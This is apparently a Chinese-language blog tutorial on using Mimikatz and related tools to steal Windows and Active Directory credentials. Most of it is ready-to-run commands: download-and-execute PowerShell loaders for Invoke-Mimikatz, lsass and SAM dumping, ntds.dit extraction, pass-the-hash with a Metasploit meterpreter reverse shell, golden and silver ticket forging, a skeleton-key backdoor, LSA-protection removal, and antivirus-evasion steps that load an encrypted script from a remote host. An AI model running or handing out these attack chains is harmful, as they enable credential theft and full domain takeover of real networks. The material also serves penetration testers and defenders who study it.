### 0x00 简介

Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！

注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。

这里放几个神器的运行姿势：九种姿势运行：Mimikatz：[https://www.freebuf.com/articles/web/176796.html](https://www.freebuf.com/articles/web/176796.html)

借用PowerShell

Copy

`#读取密码明文(需要管理员权限) powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz –DumpCerts`

Copy

`#读取密码hash值(需要管理员权限) powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes`

![](https://img2018.cnblogs.com/blog/1561366/201911/1561366-20191119154410801-226108089.png)

### 0x01 获取本地帐户密码

#### 1.1 本地执行

下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行：

Copy

`#提升权限 privilege::debug  #抓取密码 sekurlsa::logonpasswords`

当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。

cmd修改注册表命令：

Copy

`reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f #重启或用户重新登录后可以成功抓取`

#### 1.2 SAM表获取hash

Copy

`#导出SAM数据 reg save HKLM\SYSTEM SYSTEM reg save HKLM\SAM SAM  #使用mimikatz提取hash lsadump::sam /sam:SAM /system:SYSTEM`

### 0x02 Procdump+Mimikatz

当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:

Copy

`procdump64.exe -accepteula -ma lsass.exe lsass.dmp`

将lsass.dmp下载到本地后，然后执行mimikatz:

Copy

`mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit`

为了方便复制与查看，可以输出到本地文件里面：

Copy

`mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" > pssword.txt`

### 0x03 读取域控中域成员Hash

#### 3.1 域控本地读取

注：得在域控上以域管理员身份执行mimikatz

方法一：直接执行

Copy

`#提升权限 privilege::debug  抓取密码 lsadump::lsa /patch`

方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：

Copy

`#获取所有域用户 lsadump::dcsync /domain:test.com /all /csv  #指定获取某个用户的hash lsadump::dcsync /domain:test.com /user:test`

#### 3.2 导出域成员Hash

Copy

域账户的用户名和hash密码以域数据库的形式存放在域控制器的 `%SystemRoot%\ntds\NTDS.DIT` 文件中。

这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库：

Copy

`#创建快照 ntdsutil snapshot "activate instance ntds" create quit quit  #加载快照 ntdsutil snapshot "mount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit  #Copy文件副本 copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit`

将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash：

Copy

`secretsdump.py -ntds.dit -system system.hive LOCAL`

![](https://image.3001.net/images/20200304/15833020816765.png)

除了借助python，还有一个NTDSDumpEx（会被360查杀的哦）：

工具地址：[https://github.com/zcgonvh/NTDSDumpEx/releases](https://github.com/zcgonvh/NTDSDumpEx/releases)

Copy

`NTDSDumpEx -d ntds.dit -o domain.txt -s system.hiv    (system.hive文件获取:reg save hklm\system system.hive) NTDSDumpEx -d ntds.dit -o domain.txt -r               (此命令适用于在域控本地执行)`

![](https://img2020.cnblogs.com/blog/1561366/202008/1561366-20200823212336212-1217737708.png)  
![](https://img2020.cnblogs.com/blog/1561366/202008/1561366-20200823212350624-1167474990.png)

最后记得卸载删除快照：

Copy

`ntdsutil snapshot "unmount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit ntdsutil snapshot "delete  {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit`

#### 3.3 secretsdump脚本直接导出域hash

为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，简单粗暴：

Copy

`python secretsdump.py rabbitmask:123456@192.168.15.181`

首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功

### 0x04 哈希传递攻击PTH

#### 4.1 工作组环境

当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。

Copy

`#使用administrator用户的NTLM哈希值进行攻击 sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9`

Copy

`#使用xie用户的NTLM哈希值进行攻击 sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9`

在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。

![](https://img2018.cnblogs.com/blog/1561366/201911/1561366-20191119154646838-949025649.png)

或者可以直接将该主机的C盘映射到本地的K盘。  
![](https://img2018.cnblogs.com/blog/1561366/201911/1561366-20191119154740616-176611090.png)

注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。

#### 4.2 域环境

在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值

域：xie.com  
域控：WIN2008.xie.com

Copy

`#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击 sekurlsa::pth /user:administrator /domain:"xie.com" /ntlm:dbd621b8ed24eb627d32514476fac6c5` 

Copy

`#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击 sekurlsa::pth /user:xie /domain:"xie.com" /ntlm:329153f560eb329c0e1deea55e88a1e9`   

![](https://img2018.cnblogs.com/blog/1561366/201911/1561366-20191119160652568-1867019301.png)

![](https://img2018.cnblogs.com/blog/1561366/201911/1561366-20191119160707705-1807263801.png)

#### 4.3 MSF进行哈希传递

Copy

有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 `exploit/windows/smb/psexec` 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。

Copy

`msf > use  exploit/windows/smb/psexec msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp msf exploit(psexec) > set lhost 192.168.10.27 msf exploit(psexec) > set rhost 192.168.10.14 msf exploit(psexec) > set smbuser Administrator msf exploit(psexec) > set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了 msf exploit(psexec) > exploit` 

![](https://img2018.cnblogs.com/blog/1561366/201911/1561366-20191119160932393-2038942006.png)

### 0x05 票据传递攻击(PTT)

#### 5.1 黄金票据

域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。

首先获取krbtgt的用户hash:

Copy

`mimikatz "lsadump::dcsync /domain:xx.com /user:krbtgt"`

利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：

Copy

`kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi`

Copy

`#导入刚才生成的票据 kerberos::ptt test.kiribi  #导入成功后可获取域管权限 dir \\dc.abc.com\c$`

#### 5.2 白银票据

黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信

白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信

Copy

`#在域控上导出 DC$ 的 HASH mimikatz log "privilege::debug" "sekurlsa::logonpasswords"  #利用 DC$ 的 Hash制作一张 cifs 服务的白银票据 kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt  #cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统 dir \\DC.ABC.COM\C$`

#### 5.3 skeleton key

skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。

Copy

`#在域控上安装 skeleton key mimikatz.exe privilege::debug "misc::skeleton"  #在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz net use \\WIN-9P499QKTLDO.adtest.com\c$ mimikatz /user:adtest\administrator`

微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。

![](http://www.0-sec.org/%E5%9F%9F%E6%B8%97%E9%80%8F/img/70.png)

Copy

`#适用系统 windows 8.1 windows server 2012 及以上`

当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:

Copy

`privilege::debug !+ !processprotect /process:lsass.exe /remove  misc::skeleton`

#### 5.4 MS14-068

当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。

MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。

Copy

`systeminfo |find "3011780" #为空说明该服务器存在MS14-068漏洞`

操作链接：MS14-068复现(CVE-2014-6324)：[https://www.cnblogs.com/-mo-/p/11890539.html](https://www.cnblogs.com/-mo-/p/11890539.html)

### 0x06 其他

#### 6.1 使用mimikatz导出chrome中的密码

详情请见：[链接](https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd)

#### 6.2 隐藏功能

管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：

Copy

`privilege::debug misc::cmd misc::regedit misc::taskmgr`

#### 6.3 免杀处理

Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。

首先在本地对Invoke-Mimikatz.ps1进行加密处理：

Copy

`poweshell.exe Import-Module .\Out-EncryptedScript.ps1 poweshell.exe Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password 密码 -Salt 随机数 #默认生成的文件是evil.ps1  -Password   设置加密的密钥 -Salt       随机数，防止被暴力破解`

将加密生成的evil.sp1脚本放在目标机上，执行如下命令：

Copy

`#远程加载解密脚本 poweshell.exe  IEX(New-Object Net.WebClient).DownloadString("http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1")  [String] $cmd = Get-Content .\evil.ps1 Invoke-Expression $cmd $decrypted = de password salt Invoke-Expression $decrypted Invoke-Mimikatz`

![](https://img2020.cnblogs.com/blog/1561366/202003/1561366-20200328204245945-1849115138.png)